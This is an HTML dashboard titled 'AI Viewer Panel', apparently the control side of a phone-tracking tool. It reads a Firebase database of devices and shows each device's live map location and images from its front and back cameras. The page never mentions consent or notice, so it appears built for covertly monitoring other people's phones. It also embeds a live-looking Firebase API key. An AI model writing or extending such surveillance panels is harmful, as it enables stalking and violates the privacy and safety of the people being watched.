<!DOCTYPE html>
<html>
<head>

<title>AI Viewer Panel</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>

body{
margin:0;
background:black;
color:white;
font-family:Arial;
}

#topbar{
padding:10px;
background:#111;
}

select{
font-size:20px;
padding:5px;
}

#main{
display:flex;
height:90vh;
}

#mapBox{
width:50%;
}

#mapFrame{
width:100%;
height:100%;
border:none;
}

#cameraBox{
width:50%;
display:flex;
flex-direction:column;
}

.camTitle{
text-align:center;
padding:5px;
background:#111;
}

.camBox{
width:100%;
height:50%;
background:black;
border:1px solid white;
object-fit:cover;
}

</style>

</head>
<body>

<div id="topbar">

Device:
<select id="deviceList"></select>

</div>

<div id="main">

<div id="mapBox">
<iframe id="mapFrame"></iframe>
</div>

<div id="cameraBox">

<div class="camTitle">Front Camera</div>
<img id="frontCam" class="camBox">

<div class="camTitle">Back Camera</div>
<img id="backCam" class="camBox">

</div>

</div>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let deviceList=document.getElementById("deviceList");

let lastLat=null;
let lastLon=null;


// LOAD DEVICES
firebase.database().ref("devices").on("value",snap=>{

deviceList.innerHTML="";

snap.forEach(child=>{

let option=document.createElement("option");

option.value=child.key;
option.text=child.key;

deviceList.appendChild(option);

});

loadDevice();

});


deviceList.onchange=loadDevice;


function loadDevice(){

let id=deviceList.value;

if(!id) return;


// LOCATION FIX (no blink)
firebase.database().ref("devices/"+id+"/location")
.on("value",snap=>{

let d=snap.val();

if(!d) return;

if(d.lat!==lastLat || d.lon!==lastLon){

lastLat=d.lat;
lastLon=d.lon;

document.getElementById("mapFrame").src=
"https://maps.google.com/maps?q="+
d.lat+","+d.lon+"&output=embed";

}

});


// FRONT CAMERA FIX
firebase.database().ref("devices/"+id+"/camera/front")
.on("value",snap=>{

let d=snap.val();

if(d){

document.getElementById("frontCam").src=
d.img+"&t="+new Date().getTime();

}

});


// BACK CAMERA FIX
firebase.database().ref("devices/"+id+"/camera/back")
.on("value",snap=>{

let d=snap.val();

if(d){

document.getElementById("backCam").src=
d.img+"&t="+new Date().getTime();

}

});

}

</script>

</body>
</html>
